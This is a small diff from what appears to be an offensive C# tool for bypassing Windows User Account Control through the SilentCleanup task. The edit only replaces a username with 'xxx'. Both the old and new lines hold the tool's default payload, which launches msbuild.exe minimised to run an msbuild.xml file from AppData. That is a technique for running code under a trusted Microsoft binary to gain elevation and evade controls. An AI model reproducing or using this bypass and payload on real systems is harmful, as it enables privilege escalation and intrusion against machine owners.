@@ -32,7 +32,7 @@ namespace UACBypass_SilentCleanup
             else
             {
                 Console.WriteLine("[+] No Payload specified. Executing cmd.exe.");
-                payload = @"C:\Windows\System32\cmd.exe /c start /min C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\Users\Abutime\AppData\Local\Microsoft\msbuild.xml";
+                payload = @"C:\Windows\System32\cmd.exe /c start /min C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\Users\xxx\AppData\Local\Microsoft\msbuild.xml";
             }
 
             try
